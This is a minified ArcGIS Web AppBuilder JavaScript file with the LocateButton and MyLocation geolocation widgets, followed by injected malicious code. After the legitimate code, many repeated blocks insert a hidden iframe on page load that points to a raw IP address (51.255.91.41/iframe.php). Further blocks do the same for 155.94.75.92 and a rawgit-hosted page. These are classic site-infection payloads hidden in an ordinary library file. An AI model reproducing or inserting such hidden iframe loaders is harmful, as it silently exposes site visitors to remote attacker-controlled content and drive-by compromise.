// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"esri/dijit/LocateButton":function(){define("require dojo/Evented dojo/_base/declare dojo/_base/lang dojo/has ../kernel ../config dijit/_WidgetBase dijit/a11yclick dijit/_TemplatedMixin dojo/on dojo/Deferred dojo/text!./templates/LocateButton.html dojo/i18n!../nls/jsapi dojo/dom-class dojo/dom-style dojo/dom-attr ../geometry/webMercatorUtils ../geometry/Point ../SpatialReference ../graphic ../symbols/PictureMarkerSymbol ../tasks/ProjectParameters".split(" "),function(e,n,p,d,k,g,l,
c,u,v,r,m,w,x,h,t,q,y,z,A,B,C,D){e=p("esri.dijit.LocateButton",[c,v,n],{templateString:w,options:{theme:"LocateButton",map:null,visible:!0,highlightLocation:!0,symbol:new C(e.toUrl("./images/sdk_gps_location.png"),28,28),infoTemplate:null,scale:null,useTracking:!1,clearOnTrackingStop:!1,setScale:!0,centerAt:!0,timeout:15E3,graphicsLayer:null,geolocationOptions:{maximumAge:0,timeout:15E3,enableHighAccuracy:!0}},constructor:function(a,b){a=d.mixin({},this.options,a);this.domNode=b;this._i18n=x;b=navigator.geolocation;
var f=window.hasOwnProperty("isSecureContext"),f=f&&window.isSecureContext||!f&&"https:"===window.location.protocol;f&&b||(a.visible=!1);b||console.log("LocateButton::navigator.geolocation unsupported.");f||console.log("LocateButton::navigator.geolocation requires a secure origin.");this.set("map",a.map);this.set("theme",a.theme);this.set("visible",a.visible);this.set("scale",a.scale);this.set("highlightLocation",a.highlightLocation);this.set("symbol",a.symbol);this.set("infoTemplate",a.infoTemplate);
this.set("geolocationOptions",a.geolocationOptions);this.set("useTracking",a.useTracking);this.set("setScale",a.setScale);this.set("centerAt",a.centerAt);this.set("timeout",a.timeout);this.set("graphicsLayer",a.graphicsLayer);this.set("clearOnTrackingStop",a.clearOnTrackingStop);this.watch("theme",this._updateThemeWatch);this.watch("visible",this._visible);this.watch("tracking",this._locate);this.watch("useTracking",d.hitch(this,function(){this.get("tracking")&&!this.get("useTracking")&&this._stopTracking();
this._setTitle()}));this._css={container:"locateContainer",locate:"zoomLocateButton",loading:"loading",tracking:"tracking"}},postCreate:function(){this.inherited(arguments);this.own(r(this._locateNode,u,d.hitch(this,this.locate)))},startup:function(){this.inherited(arguments);this.get("map")||(this.set("visible",!1),console.log("LocateButton::map required"));if(this.get("map").loaded)this._init();else r.once(this.get("map"),"load",d.hitch(this,function(){this._init()}))},destroy:function(){this.clear();
this._graphicsEvent&&this._graphicsEvent.remove();this._removeWatchPosition();this.inherited(arguments)},clear:function(){var a=this.get("highlightGraphic"),b=this.get("graphicsLayer");a&&(b?b.remove(a):this.get("map").graphics.remove(a),this.set("highlightGraphic",null))},locate:function(){this.get("useTracking")&&this.set("tracking",!this.get("tracking"));return this._locate()},show:function(){this.set("visible",!0)},hide:function(){this.set("visible",!1)},_setTitle:function(){this.get("useTracking")?
this.get("tracking")?q.set(this._locateNode,"title",this._i18n.widgets.locateButton.locate.stopTracking):q.set(this._locateNode,"title",this._i18n.widgets.locateButton.locate.tracking):q.set(this._locateNode,"title",this._i18n.widgets.locateButton.locate.title)},_removeWatchPosition:function(){this.get("watchId")&&(navigator.geolocation.clearWatch(this.get("watchId")),this.set("watchId",null));this._removePrivateVars()},_stopTracking:function(){h.remove(this._locateNode,this._css.tracking);this._removeWatchPosition();
this.get("clearOnTrackingStop")&&this.clear();this._hideLoading()},_positionToObject:function(a){return a?{coords:d.mixin({},a.coords),timestamp:a.timestamp}:{}},_startTracking:function(){h.add(this._locateNode,this._css.tracking);this._removeWatchPosition();var a=navigator.geolocation.watchPosition(d.hitch(this,function(a){a=this._positionToObject(a);this._setPosition(a).then(d.hitch(this,function(a){this._locateEvent(a)}),d.hitch(this,function(a){a||(a=Error("LocateButton::Error setting the position."));
this._locateError(a)}))}),d.hitch(this,function(a){this.set("tracking",!1);a||(a=Error("LocateButton::Could not get tracking position."));this._locateError(a)}),this.get("geolocationOptions"));this.set("watchId",a)},_removePrivateVars:function(){this._scale=this._position=this._graphic=null},_getCurrentPosition:function(){var a=new m;this._removePrivateVars();var b=setTimeout(d.hitch(this,function(){clearTimeout(b);a.reject(Error("LocateButton::time expired for getting location."))}),this.get("timeout"));
navigator.geolocation.getCurrentPosition(d.hitch(this,function(f){f=this._positionToObject(f);clearTimeout(b);this._setPosition(f).then(d.hitch(this,function(b){a.resolve(b)}),d.hitch(this,function(b){b||(b=Error("LocateButton::Error setting map position."));a.reject(b)}))}),d.hitch(this,function(b){b||(b=Error("LocateButton::Could not get current position."));a.reject(b)}),this.get("geolocationOptions"));return a.promise},_locate:function(){var a=new m;this._showLoading();if(navigator.geolocation)this.get("useTracking")?
this.get("tracking")?(this._startTracking(),a.resolve({tracking:!0})):(this._stopTracking(),a.resolve({tracking:!1})):this._getCurrentPosition().then(d.hitch(this,function(b){this._locateEvent(b);a.resolve(b)}),d.hitch(this,function(b){b||(b=Error("LocateButton::Could not get current position."));this._locateError(b);a.reject(b)}));else{var b=Error("LocateButton::geolocation unsupported");this._locateError(b);a.reject(b)}this._setTitle();return a.promise},_projectPoint:function(a){var b=new m,f=this.get("map").spatialReference,
c=f.wkid;f.isWebMercator()?(a=y.geographicToWebMercator(a),b.resolve(a)):l.defaults.geometryService&&4326!==c?(c=new D,c.geometries=[a],c.outSR=f,l.defaults.geometryService.project(c).then(d.hitch(this,function(a){a&&a.length?b.resolve(a[0]):b.reject(Error("LocateButton::Point was not projected."))}),function(a){a||(a=Error("LocateButton::please specify a geometry service on esri/config to project."));b.reject(a)})):b.resolve(a);return b.promise},_getScale:function(a){var b=this.get("scale");return a&&
a.coords?b||a.coords.accuracy||5E4:b||5E4},_createPoint:function(a){var b;a&&a.coords&&(b=new z([a.coords.longitude,a.coords.latitude],new A({wkid:4326})));return b},_setPosition:function(a){var b=new m,c,e;this._removePrivateVars();if((this._position=a)&&a.coords){if(c=this._createPoint(a))this._graphic=e=this._createGraphic(c,a);var g=this._getScale(a);this._scale=g;c?this._projectPoint(c).then(d.hitch(this,function(c){this._graphic=e=this._createGraphic(c,a);var f={graphic:e,scale:g,position:a};
this.get("setScale")&&this.get("map").setScale(g);this.get("centerAt")?this.get("map").centerAt(c).then(d.hitch(this,function(){b.resolve(f)}),d.hitch(this,function(a){a||(a=Error("LocateButton::Could not center map."));b.reject(a)})):b.resolve(f)}),d.hitch(this,function(a){a||(a=Error("LocateButton::Error projecting point."));b.reject(a)})):(c=Error("LocateButton::Invalid point"),b.reject(c))}else c=Error("LocateButton::Invalid position"),b.reject(c);return b.promise},_createGraphic:function(a,b){var c;
a&&(b={position:b},c=new B(a,this.get("symbol"),b,this.get("infoTemplate")));return c},_locateEvent:function(a){if(a.graphic){var b=this.get("highlightGraphic"),c=this.get("graphicsLayer");b?(b.setGeometry(a.graphic.geometry),b.setAttributes(a.graphic.attributes),b.setInfoTemplate(a.graphic.infoTemplate),b.setSymbol(a.graphic.symbol)):(b=a.graphic,this.get("highlightLocation")&&(c?c.add(b):this.get("map").graphics.add(b)));this.set("highlightGraphic",b)}this._hideLoading();this.emit("locate",a)},
_locateError:function(a){a={graphic:this._graphic,scale:this._scale,position:this._position,error:a};this._hideLoading();this.emit("locate",a)},_showLoading:function(){this.get("useTracking")||h.add(this._locateNode,this._css.loading)},_hideLoading:function(){this.get("useTracking")||h.remove(this._locateNode,this._css.loading)},_init:function(){this._visible();this._setTitle();this.get("tracking")&&this.get("useTracking")&&this._locate();this.set("loaded",!0);this.emit("load",{})},_updateThemeWatch:function(a,
b,c){h.remove(this.domNode,b);h.add(this.domNode,c)},_visible:function(){this.get("visible")?t.set(this.domNode,"display","block"):t.set(this.domNode,"display","none")}});k("extend-esri")&&d.setObject("dijit.LocateButton",e,g);return e})},"widgets/MyLocation/_build-generate_module":function(){define(["dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:esri/dijit/templates/LocateButton.html":'\x3cdiv class\x3d"${theme}" role\x3d"presentation"\x3e\r\n    \x3cdiv class\x3d"${_css.container}"\x3e\r\n            \x3cdiv data-dojo-attach-point\x3d"_locateNode" role\x3d"button" class\x3d"${_css.locate}" tabindex\x3d"0"\x3e\x3cspan\x3e${_i18n.widgets.locateButton.locate.button}\x3c/span\x3e\x3c/div\x3e\r\n    \x3c/div\x3e\r\n\x3c/div\x3e\r\n',
"url:widgets/MyLocation/css/style.css":'.jimu-widget-mylocation{border-radius: 5px; background-color: #ccc; background-color: rgba(0,0,0,0.2);}.jimu-widget-mylocation.onCenter {background-color: #000;}.jimu-widget-mylocation .place-holder {padding: 2px; width: 30px; height: 30px; background-color: #666; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; cursor: pointer; -webkit-border-radius: 5px; -moz-border-radius: 5px; -o-border-radius: 5px; border-radius: 5px; background-image: url("images/locate.png"); background-position: center center; background-repeat: no-repeat;}.jimu-widget-mylocation .place-holder.locating{background-image: url("images/loading.gif");}.jimu-widget-mylocation .place-holder.tracking{background-image: url("images/stop.png") !important; background-color: #000;}.jimu-widget-mylocation .place-holder.nohttps{background-image: url("images/locate_disabled.png") !important;}.jimu-widget-mylocation .nohttps:hover{background-color: rgba(0,0,0,0) !important;}.jimu-widget-mylocation .place-holder{background-color: rgba(0,0,0,0);}.jimu-widget-mylocation.onLocate .place-holder{background-color: rgba(0,0,0,0.4);}.jimu-widget-mylocation.onCenter .place-holder{background-color: #000;}.jimu-widget-mylocation .place-holder:hover{background-color: rgba(0,0,0,0.4);}',
"*now":function(e){e(['dojo/i18n!*preload*widgets/MyLocation/nls/Widget*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare jimu/BaseWidget esri/dijit/LocateButton dojo/_base/html dojo/on dojo/_base/lang jimu/utils jimu/dijit/Message dojo/touch".split(" "),function(e,n,p,d,k,g,l){e=e([n],{name:"MyLocation",baseClass:"jimu-widget-mylocation",moveTopOnActive:!1,startup:function(){this.inherited(arguments);this.placehoder=d.create("div",{"class":"place-holder",title:this.label},this.domNode);this.isNeedHttpsButNot=l.isNeedHttpsButNot();!0===this.isNeedHttpsButNot?(console.log("LocateButton::navigator.geolocation requires a secure origin."),
d.addClass(this.placehoder,"nohttps"),d.setAttr(this.placehoder,"title",this.nls.httpNotSupportError)):window.navigator.geolocation?(this.own(k(this.placehoder,"click",g.hitch(this,this.onLocationClick))),this.own(k(this.map,"zoom-end",g.hitch(this,this._scaleChangeHandler)))):d.setAttr(this.placehoder,"title",this.nls.browserError)},onLocationClick:function(){d.hasClass(this.domNode,"onCenter")||d.hasClass(this.domNode,"locating")?(d.removeClass(this.domNode,"onCenter"),d.removeClass(this.placehoder,
"tracking"),this._destroyGeoLocate()):(this._createGeoLocate(),this.geoLocate.locate(),d.addClass(this.placehoder,"locating"))},_scaleChangeHandler:function(){var c=this.map.getScale();c&&this.geoLocate&&this.geoLocate.useTracking&&(this.geoLocate.scale=c)},onLocateOrError:function(c){if(c.error)this.onLocateError(c);else this.onLocate(c)},onLocate:function(c){d.removeClass(this.placehoder,"locating");this.geoLocate.useTracking&&d.addClass(this.placehoder,"tracking");if(c.error)this.onLocateError(c);
else d.addClass(this.domNode,"onCenter"),this.neverLocate=!1},onLocateError:function(c){console.error(c.error);d.removeClass(this.placehoder,"locating");d.removeClass(this.domNode,"onCenter");d.removeClass(this.placehoder,"tracking")},_createGeoLocate:function(){var c=this.config.locateButton;c.map=this.map;"undefined"===typeof this.config.locateButton.useTracking&&(c.useTracking=!0);c.centerAt=!0;c.setScale=!0;var d={maximumAge:0,timeout:15E3,enableHighAccuracy:!0};c.geolocationOptions&&(c.geolocationOptions=
g.mixin(d,c.geolocationOptions));11===l.has("ie")&&(c.geolocationOptions.maximumAge=300,c.geolocationOptions.enableHighAccuracy=!1);this.geoLocate=new p(c);this.geoLocate.startup();this.geoLocate.own(k(this.geoLocate,"locate",g.hitch(this,this.onLocateOrError)))},_destroyGeoLocate:function(){this.geoLocate&&(this.geoLocate.clear(),this.geoLocate.destroy());this.geoLocate=null},destroy:function(){this._destroyGeoLocate();this.inherited(arguments)}});e.inPanel=!1;e.hasUIFile=!1;return e});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});